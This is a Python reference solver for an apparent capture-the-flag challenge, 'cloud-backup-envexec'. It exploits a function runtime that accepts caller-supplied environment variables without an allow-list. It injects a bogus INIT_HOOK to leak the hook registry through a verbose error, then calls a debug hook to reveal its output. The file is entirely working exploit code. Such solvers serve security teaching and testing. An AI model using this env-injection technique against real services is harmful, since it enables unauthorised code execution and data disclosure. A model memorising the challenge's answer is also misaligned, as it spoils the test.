#!/usr/bin/env python3
"""Reference solver for cloud-backup-envexec.

The runtime applies caller-supplied env with no allow-list and consults
INIT_HOOK. Probe with a bogus hook to leak the registry, then invoke with the
debug `reveal` init hook.

    python3 solve.py http://HOST:PORT
"""
import json
import sys
import urllib.request


def _post(url, obj):
    data = json.dumps(obj).encode()
    req = urllib.request.Request(
        url, data=data, headers={"Content-Type": "application/json"}, method="POST"
    )
    try:
        return json.loads(urllib.request.urlopen(req, timeout=10).read())
    except urllib.error.HTTPError as e:
        return json.loads(e.read())


def solve(base):
    base = base.rstrip("/")
    # 1) leak the init-hook registry via a verbose error
    probe = _post(base + "/invoke", {"fn": "greet", "env": {"INIT_HOOK": "x"}})
    hooks = probe.get("available_hooks", [])
    hook = next(h for h in hooks if h != "noop")
    # 2) run the debug hook
    out = _post(base + "/invoke", {"fn": "greet", "env": {"INIT_HOOK": hook}})
    return out["init_hook_output"]


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
